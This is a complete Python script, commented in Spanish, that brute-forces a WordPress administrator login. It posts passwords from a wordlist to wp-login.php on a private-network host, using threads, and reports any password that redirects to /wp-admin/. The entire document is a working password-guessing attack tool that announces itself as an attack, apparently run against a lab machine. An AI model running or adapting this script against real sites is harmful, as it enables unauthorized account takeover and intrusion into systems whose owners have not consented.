import requests
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

# CONFIGURACIÓN
host = "192.168.0.137"
url_login = f"http://{host}/wp-login.php"
usuario = "wordpress-user"
diccionario = "passwords.txt"
MAX_WORKERS = 2  # Ajusta según capacidad del servidor

# Configuración completa de headers (corregido)
headers = {
    "Host": host,
    "Origin": f"http://{host}",
    "Content-Type": "application/x-www-form-urlencoded",
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Referer": f"http://{host}/wp-login.php",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "es-ES,es;q=0.9"
}

# Cookies completas (corregido)
cookies = {
    "wordpress_test_cookie": "WP Cookie check"
}

# Variables compartidas
found_event = threading.Event()
print_lock = threading.Lock()
counter = 0
start_time = None

def init_session():
    session = requests.Session()
    session.headers.update(headers)
    session.cookies.update(cookies)
    return session

def try_password(session, password, index):
    global counter
    
    if found_event.is_set():
        return None

    data = {
        "log": usuario,
        "pwd": password,
        "wp-submit": "Log In",
        "redirect_to": f"http://{host}/wp-admin/",
        "testcookie": "1"
    }

    try:
        response = session.post(url_login, data=data, allow_redirects=False, timeout=10)
        
        if response.status_code == 302 and "/wp-admin/" in response.headers.get("Location", ""):
            with print_lock:
                print(f"\n✅ ¡Contraseña encontrada!: {password} (intento #{index})")
            found_event.set()
            return True
    except:
        return False

    # Actualización del contador
    with print_lock:
        counter += 1
        if counter % 100 == 0:
            elapsed = time.time() - start_time
            requests_per_sec = counter / elapsed
            remaining = (total - counter) / (requests_per_sec * MAX_WORKERS)
            print(f"[Progreso: {counter}/{total}] Velocidad: {requests_per_sec:.1f} req/s - Tiempo restante: {remaining:.1f}s", end='\r')

    return False

# Carga de contraseñas
with open(diccionario, "r", encoding="utf-8", errors="ignore") as f:
    passwords = [line.strip() for line in f if line.strip()]

total = len(passwords)
print(f"🔍 Iniciando ataque contra {host} ({total} contraseñas)")
start_time = time.time()

with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
    futures = []
    session = init_session()
    
    for idx, pwd in enumerate(passwords, 1):
        if found_event.is_set():
            break
        futures.append(executor.submit(try_password, session, pwd, idx))
    
    for future in as_completed(futures):
        if future.result():
            executor.shutdown(wait=False)
            for f in futures:
                f.cancel()
            break

if not found_event.is_set():
    print("\n🚫 Contraseña no encontrada en el diccionario.")

print(f"\n⏱️ Tiempo total: {time.time() - start_time:.2f} segundos")
